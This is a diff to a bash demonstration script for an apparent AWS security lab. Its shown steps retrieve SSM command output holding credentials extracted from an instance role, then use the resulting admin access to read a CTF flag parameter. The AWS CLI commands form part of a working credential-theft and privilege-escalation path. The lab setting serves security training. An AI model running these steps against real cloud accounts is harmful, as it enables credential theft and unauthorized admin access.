@@ -284,11 +284,12 @@ fi
 echo ""
 
 # [EXPLOIT] Step 9: Retrieve command output containing credentials
+# ssm:ListCommandInvocations is a helpful permission (restricted on starting user during
+# validation), so use readonly creds to poll the output — same pattern as Step 8.
 echo -e "${YELLOW}Step 9: Retrieving command output with extracted credentials${NC}"
-use_starting_creds
-export AWS_REGION=$AWS_REGION
+use_readonly_creds
 
-show_attack_cmd "Attacker" "aws ssm list-command-invocations --region $AWS_REGION --command-id \"$COMMAND_ID\" --details --query 'CommandInvocations[0].CommandPlugins[0].Output' --output text"
+show_cmd "ReadOnly" "aws ssm list-command-invocations --region $AWS_REGION --command-id \"$COMMAND_ID\" --details --query 'CommandInvocations[0].CommandPlugins[0].Output' --output text"
 CREDS_JSON=$(aws ssm list-command-invocations \
     --region $AWS_REGION \
     --command-id "$COMMAND_ID" \
@@ -348,8 +349,9 @@ echo ""
 # [EXPLOIT] Step 12: Capture the CTF flag
 echo -e "${YELLOW}Step 12: Capturing the CTF flag${NC}"
 # Admin credentials are already exported from the extracted instance role creds
-show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/ssm-002-to-admin --query 'Parameter.Value' --output text"
+show_attack_cmd "Attacker" "aws ssm get-parameter --region $AWS_REGION --name /pathfinding-labs/flags/ssm-002-to-admin --query 'Parameter.Value' --output text"
 FLAG_VALUE=$(aws ssm get-parameter \
+    --region $AWS_REGION \
     --name /pathfinding-labs/flags/ssm-002-to-admin \
     --query 'Parameter.Value' \
     --output text)
